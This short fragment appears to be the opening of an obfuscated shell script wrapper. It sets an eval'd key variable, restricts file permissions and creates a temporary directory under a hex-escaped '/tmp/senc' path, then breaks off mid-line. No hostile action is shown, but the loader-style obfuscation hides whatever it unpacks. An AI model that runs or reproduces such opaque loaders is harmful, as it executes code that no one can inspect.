eval K32134=32151;KEY=826;set -C;set -o pipefail;code=0;UMASK=$(umask);umask 077;xdir=$(mktemp -d $'\x2f\x74\x6d\x70\x2f\x73\x65\x6e\x63\x2e\x58\x58\x58\x58\x58\x58') || { :; echo 'ca
